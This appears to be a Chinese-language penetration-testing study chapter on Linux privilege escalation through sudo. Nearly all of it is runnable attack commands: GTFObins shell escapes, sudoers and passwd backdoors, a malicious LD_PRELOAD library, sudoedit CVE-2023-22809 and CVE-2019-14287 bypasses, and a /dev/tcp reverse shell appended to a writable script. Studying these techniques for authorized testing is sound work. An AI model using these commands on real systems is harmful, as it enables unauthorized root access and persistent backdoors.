# 第 90 章 - Sudo

## 標籤

- #cpts
- #chapter
- #linux
- #sudo
- #priv-esc

## 學習目標

- 能判讀 `sudo -l` 輸出並識別可利用的規則。
- 知道 GTFObins 的使用方式，找到特定工具的 sudo escape 方法。
- 理解 sudoedit 的 CVE-2023-22809 漏洞原理。
- 知道環境變數（LD_PRELOAD）如何搭配 sudo 提權。

---

## 理論基礎：sudo 提權面

| 情境 | 原因 | 利用方式 |
|------|------|---------|
| sudo /bin/bash | 直接委派 shell | sudo bash |
| sudo vim / nano / less | 編輯器可執行 shell 命令 | GTFObins escape |
| sudo awk / python / perl | 腳本語言可執行系統命令 | os.system / system() |
| sudo find | find 可執行 -exec 命令 | find . -exec /bin/sh |
| sudo tcpdump | 可加載腳本 | -z 參數執行任意指令 |
| NOPASSWD 任意腳本 | 腳本可寫 → 替換 | 修改腳本內容 |
| sudo env_keep LD_PRELOAD | 保留環境變數 | 惡意 .so 提權 |

---

## 步驟一：查看 sudo 規則

```bash
sudo -l
# -l → 列出當前使用者可以 sudo 的命令

# 輸出格式說明：
# User user may run the following commands on HOST:
#     (ALL : ALL) NOPASSWD: /usr/bin/vim
#
# (ALL : ALL) → (執行身份 : 群組) → ALL 表示可用任何身份執行
# NOPASSWD:   → 不需要輸入密碼
# /usr/bin/vim → 允許的命令（完整路徑 → 防止 PATH 繞過）

# 輸出中的關鍵字：
# NOPASSWD    → 不需密碼，最好利用
# ALL         → 完整委派
# (root)      → 以 root 身份執行
# !           → 排除的命令（有些繞過方式）
# env_keep    → 可保留哪些環境變數
```

---

## 方法一：GTFObins Shell Escape

常見工具的 sudo shell escape：

```bash
# ─── vim / vi / nano ───
sudo vim -c ':!/bin/bash'
# -c → 執行 vim 命令（:!shell_cmd 在 vim 中執行 shell 命令）
# 或在 vim 互動中輸入 :!/bin/bash

sudo nano
# 在 nano 中按 Ctrl+R → Ctrl+X → 輸入指令

# ─── less / more ───
sudo less /etc/passwd
# 在 less 中輸入 !/bin/bash
# ! 後面接 shell 命令

# ─── awk ───
sudo awk 'BEGIN {system("/bin/bash")}'
# awk 'pattern {action}' → 無輸入直接執行 action
# BEGIN → 在讀取任何輸入前執行
# system() → 執行系統命令

# ─── python / python3 ───
sudo python3 -c 'import os; os.system("/bin/bash")'
# -c → 執行字串中的 Python 程式碼
# os.system() → 執行 shell 命令（繼承 root 身份）

sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
# pty.spawn → 產生 pseudo-terminal（更穩定）

# ─── perl ───
sudo perl -e 'exec "/bin/bash";'
# -e → 執行字串中的 Perl 程式碼
# exec → 替換當前程序（以 root 執行 bash）

# ─── ruby ───
sudo ruby -e 'exec "/bin/bash"'

# ─── find ───
sudo find . -exec /bin/bash \;
# -exec COMMAND \; → 對每個找到的檔案執行 COMMAND
# . → 當前目錄（找任何檔案都觸發）
# 也可以：
sudo find . -name anything -exec /bin/sh -p \;
# -p → 保留 privilege（不 drop setuid）

# ─── nmap（舊版）───
sudo nmap --interactive
# 在 nmap 的互動模式輸入 !sh
# 只適用於 nmap < 5.21

# ─── tcpdump ───
COMMAND='cp /bin/bash /tmp/bash_root && chmod +s /tmp/bash_root'
echo "$COMMAND" > /tmp/rootme.sh
chmod +x /tmp/rootme.sh
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/rootme.sh -Z root
# -z → dump 完成後執行的命令（執行我們的腳本）
# 之後：/tmp/bash_root -p → -p 保留 SUID 的 effective UID

# ─── cp / mv ───
# 覆蓋 /etc/sudoers 或 /etc/passwd
sudo cp /dev/stdin /etc/passwd
# 輸入新的 /etc/passwd 內容（加入 root 帳號）

# ─── tee ───
echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/backdoor
# tee → 讀取 stdin 並寫入文件
# /etc/sudoers.d/ → sudo 讀取此目錄下的設定
# 效果：給當前使用者完整 sudo 權限
```

---

## 方法二：LD_PRELOAD 環境變數

```bash
# 前提：sudo -l 輸出中有：
# env_keep+=LD_PRELOAD

# Step 1：建立惡意 shared library（在 Kali）
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
# _init() → 當 library 被載入時自動執行

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
# -fPIC       → Position-Independent Code（shared library 必要）
# -shared     → 編譯成共享函式庫
# -o          → 輸出檔案名
# -nostartfiles → 不加預設啟動代碼（我們有自己的 _init）

# Step 2：利用 LD_PRELOAD 執行 sudo
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/任意允許的命令
# LD_PRELOAD → 強制在任何 library 前先載入我們的 .so
# 效果：sudo 執行時載入我們的 shell.so → 觸發 _init() → root shell
```

---

## 方法三：sudoedit CVE-2023-22809（sudo < 1.9.12p2）

```bash
# 確認 sudo 版本
sudo --version
# 若小於 1.9.12p2 → 可能存在 CVE-2023-22809

# 原理：sudoedit 的 --editor 參數可以附加 extra file
# 如果 sudo 規則是：
# user ALL=(ALL) sudoedit /etc/nginx/nginx.conf
# 可以用 -- 傳入額外參數讓 editor 開啟不在規則內的檔案

EDITOR="vim -- /etc/sudoers" sudoedit /etc/nginx/nginx.conf
# EDITOR → 指定使用哪個編輯器
# -- /etc/sudoers → vim 同時開啟 /etc/sudoers
# 效果：以高權限編輯 /etc/sudoers → 加入 NOPASSWD:ALL
```

---

## 方法四：sudo 可寫腳本

```bash
# 情境：sudo 規則允許執行一個腳本，但腳本本身可被我們修改
# sudo -l 輸出：
# (ALL) NOPASSWD: /opt/backup/run.sh

# Step 1：確認腳本可寫
ls -la /opt/backup/run.sh
# 找 -rwxrwxr-x 或 other write 權限

# Step 2：修改腳本加入提權指令
echo "chmod +s /bin/bash" >> /opt/backup/run.sh
# >> → 追加（不覆蓋原有內容）
# chmod +s → 設定 SUID bit

# 或直接加 reverse shell
echo "bash -i >& /dev/tcp/KALI_IP/443 0>&1" >> /opt/backup/run.sh

# Step 3：執行腳本（以 root 身份）
sudo /opt/backup/run.sh

# Step 4：利用 SUID bash（若用了 chmod +s 方法）
/bin/bash -p
# -p → 保留 SUID 設定的 effective UID（root）
```

---

## 判斷邏輯

```
sudo -l 輸出分析：

有 NOPASSWD 且工具在 GTFObins 上？
└── 直接查 gtfobins.github.io → sudo 欄位 → 執行 escape

有 NOPASSWD 且是腳本？
└── 確認腳本是否可寫 → 修改腳本 → 執行

有 env_keep+=LD_PRELOAD？
└── 編譯惡意 .so → LD_PRELOAD 執行

有限制但用 ! 排除？（如 !root）
└── 嘗試繞過：sudo -u#-1 /bin/bash（CVE-2019-14287）

是 sudoedit 且 sudo < 1.9.12p2？
└── CVE-2023-22809 → 編輯任意檔案
```

---

## 速查表

```bash
# 查 sudo 規則
sudo -l

# GTFObins 常用 escape（有 vim）
sudo vim -c ':!/bin/bash'

# GTFObins（有 python3）
sudo python3 -c 'import os; os.system("/bin/bash")'

# GTFObins（有 find）
sudo find . -exec /bin/bash \;

# GTFObins（有 awk）
sudo awk 'BEGIN {system("/bin/bash")}'

# LD_PRELOAD（需要 env_keep+=LD_PRELOAD）
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/allowed_cmd

# sudo 版本（找 CVE）
sudo --version
```

---

## 關聯筆記

- [[89-本機列舉|第 89 章 - 本機列舉]]
- [[92-Cron與可寫路徑|第 92 章 - Cron 與可寫路徑]]
- [[11-Volume-11-Linux-Privilege-Escalation-Index|Vol.11 - Linux PrivEsc]]
